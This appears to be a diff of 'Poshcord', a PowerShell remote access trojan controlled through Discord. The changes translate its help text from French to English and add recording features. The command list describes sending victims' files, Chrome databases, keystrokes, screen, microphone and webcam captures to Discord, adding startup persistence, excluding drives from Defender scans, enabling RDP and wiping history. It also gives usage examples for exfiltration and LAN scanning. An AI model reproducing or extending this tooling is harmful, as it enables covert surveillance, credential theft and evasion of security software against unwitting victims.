@@ -52,49 +52,57 @@ $script:jsonPayload = @{
         @{
             title       = "$env:COMPUTERNAME | Commands List "
             "description" = @"
-- **Systeminfo**: Envoyer les informations système sous forme de fichier texte sur Discord
-- **QuickInfo**: Envoyer un aperçu rapide des informations système dans un message intégré (envoyé lors de la première connexion)
-- **FolderTree**: Enregistrer les arborescences de dossiers dans un fichier et les envoyer sur Discord
-- **Lan**: Afficher les appareils sur le réseau local (voir Info supplémentaire)
-- **ChromeDB**: Récupérer les fichiers de base de données de Chrome et les envoyer sur Discord
+- **SpeechToText**: Send audio transcript to Discord
+- **Systeminfo**: Send System info as text file to Discord
+- **QuickInfo**: Send a quick System info embed (sent on first connect)
+- **FolderTree**: Save folder trees to file and send to Discord
+- **EnumerateLAN**: Show devices on LAN (see ExtraInfo)
+- **NearbyWifi**: Show nearby wifi networks (!user popup!)
+- **ChromeDB**:  Gather Database files from Chrome and send to Discord
 
-- **AddPersistance**: Ajouter ce script au démarrage
-- **RemovePersistance**: Retirer Poshcord du démarrage
-- **IsAdmin**: Vérifier si la session est administrateur
-- **Elevate**: Tenter de redémarrer le script en tant qu'administrateur (popup utilisateur !)
-- **ExcludeCDrive**: Exclure le disque C:/ de toutes les analyses de Defender
-- **ExcludeAllDrives**: Exclure les disques C:/ à G:/ de toutes les analyses de Defender
-- **EnableRDP**: Activer le Bureau à distance sur la cible
-- **EnableIO**: Activer le clavier 
-- **DisableIO**: Désactiver le clavier
+- **AddPersistance**: Add this script to startup.
+- **RemovePersistance**: Remove Poshcord from startup
+- **IsAdmin**: Check if the session is admin
+- **Elevate**: Attempt to restart script as admin (!user popup!)
+- **ExcludeCDrive**: Exclude C:/ Drive from all Defender Scans
+- **ExcludeAllDrives**: Exclude C:/ - G:/ Drives from Defender Scans
+- **EnableRDP**: Enable Remote Desktop on target.
+- **EnableIO**: Enable Keyboard and Mouse
+- **DisableIO**: Disable Keyboard and Mouse
 
-- **TakePicture**: Envoyer une photo prise avec la webcam sur Discord
-- **Exfiltrate**: Envoyer divers fichiers (voir Info supplémentaire)
-- **Upload**: Téléverser un fichier
-- **Download**: Télécharger un fichier (joindre un fichier avec la commande)
-- **Keycapture**: Capturer les frappes clavier et les envoyer sur Discord
+- **RecordAudio**: Record microphone and send to Discord
+- **RecordScreen**: Record Screen and send to Discord
+- **TakePicture**: Send a webcam picture and send to Discord
+- **Exfiltrate**: Send various files. (see ExtraInfo)
+- **Upload**: Upload a file. (see ExtraInfo)
+- **Download**: Download a file. (attach a file with the command)
+- **Screenshot**: Sends a screenshot of the desktop and send to Discord
+- **Keycapture**: Capture Keystrokes and send to Discord
 
-- **FakeUpdate**: Simuler l'écran de mise à jour Windows-10 en utilisant Chrome
-- **Windows93**: Lancer une parodie de Windows93 en utilisant Chrome
-- **WindowsIdiot**: Lancer un faux Windows95 en utilisant Chrome
-- **SendHydra**: Popups sans fin (utiliser un interrupteur d'arrêt pour arrêter)
-- **SoundSpam**: Jouer tous les sons par défaut de Windows sur la cible
-- **VoiceMessage**: Envoyer une fenêtre de message à l'utilisateur (popup utilisateur !)
-- **MinimizeAll**: Réduire toutes les fenêtres
-- **EnableDarkMode**: Activer le mode sombre sur l'ensemble du système
-- **DisableDarkMode**: Désactiver le mode sombre sur l'ensemble du système
-- **ShortcutBomb**: Créer 50 raccourcis sur le bureau
-- **Wallpaper**: Définir le fond d'écran (wallpaper -url http://img.com/f4wc)
-- **Goose**: Faire apparaître une oie agaçante (Application de Sam Pearson)
-- **ScreenParty**: Lancer une fête disco sur l'écran !
+- **FakeUpdate**: Spoof Windows-10 update screen using Chrome
+- **Windows93**: Start parody Windows93 using Chrome
+- **WindowsIdiot**: Start fake Windows95 using Chrome
+- **SendHydra**: Never ending popups (use killswitch) to stop
+- **SoundSpam**: Play all Windows default sounds on the target
+- **Message**: Send a message window to the User (!user popup!)
+- **VoiceMessage**: Send a message window to the User (!user popup!)
+- **MinimizeAll**: Send a voice message to the User
+- **EnableDarkMode**: Enable System wide Dark Mode
+- **DisableDarkMode**: Disable System wide Dark Mode\
+- **VolumeMax**: Maximise System Volume
+- **VolumeMin**: Minimise System Volume
+- **ShortcutBomb**: Create 50 shortcuts on the desktop.
+- **Wallpaper**: Set the wallpaper (wallpaper -url http://img.com/f4wc)
+- **Goose**: Spawn an annoying goose (Sam Pearson App)
+- **ScreenParty**: Start A Disco on screen!
 
-- **ExtraInfo**: Obtenir une liste d'informations supplémentaires et d'exemples de commandes
-- **Cleanup**: Effacer l'historique (exécuter l'invite de commande, PowerShell, corbeille, dossier Temp)
-- **Kill**: Arrêter un module en cours d'exécution (ex. Keycapture / Exfiltrate)
-- **ControlAll**: Contrôler toutes les sessions en attente simultanément
-- **ShowAll**: Afficher toutes les sessions en attente dans le chat
-- **Pause**: Mettre en pause la session authentifiée actuelle
-- **Close**: Fermer cette session
+- **ExtraInfo**: Get a list of further info and command examples
+- **Cleanup**: Wipe history (run prompt, powershell, recycle bin, Temp)
+- **Kill**: Stop a running module (eg. Keycapture / Exfiltrate)
+- **ControlAll**: Control all waiting sessions simultaneously
+- **ShowAll**: Show all waiting sessions in chat.
+- **Pause**: Pause the current authenticated session
+- **Close**: Close this session
 "@
             color       = 65280
         }
@@ -114,31 +122,37 @@ $script:jsonPayload = @{
 ``````Example Commands``````
 
 **Default PS Commands:**
-> PS> ``whoami`` (Renvoie des commandes Powershell)
+> PS> ``whoami`` (Returns Powershell commands)
 
 **Exfiltrate Command Examples:**
 > PS> ``Exfiltrate -Path Documents -Filetype png``
 > PS> ``Exfiltrate -Filetype log``
 > PS> ``Exfiltrate``
-Exfiltrate enverra uniquement de nombreux types de fichiers prédéfinis
-à partir de tous les dossiers utilisateurs comme Documents, Téléchargements, etc.
+Exfiltrate only will send many pre-defined filetypes
+from all User Folders like Documents, Downloads etc..
 
 **Upload Command Example:**
 > PS> ``Upload -Path C:/Path/To/File.txt``
-Utiliser la commande 'FolderTree' pour afficher tous les fichiers
+Use 'FolderTree' command to show all files
 
-**LAN Example:**
-> PS> ``Lan -Prefix 192.168.1.``
-Cet exemple scannera de 192.168.1.1 à 192.168.1.254
+**Enumerate-LAN Example:**
+> PS> ``EnumerateLAN -Prefix 192.168.1.``
+This Eg. will scan 192.168.1.1 to 192.168.1.254
 
 **Prank Examples:**
+> PS> ``Message 'Your Message Here!'``
 > PS> ``VoiceMessage 'Your Message Here!'``
 > PS> ``wallpaper -url http://img.com/f4wc``
+
+**Record Examples:**
+> PS> ``RecordAudio -t 100`` (number of seconds to record)
+> PS> ``RecordScreen -t 100`` (number of seconds to record)
 
 **Kill Command modules:**
 - Keycapture
 - Exfiltrate
 - SendHydra
+- SpeechToText
 "@
             color       = 65280
         }
@@ -154,7 +168,6 @@ Function CleanUp {
     Clear-RecycleBin -Force -ErrorAction SilentlyContinue
     sendMsg -Message ":white_check_mark: ``Clean Up Task Complete`` :white_check_mark:"
 }
-
 # --------------------------------------------------------------- INFO FUNCTIONS ------------------------------------------------------------------------
 
 Function FolderTree{
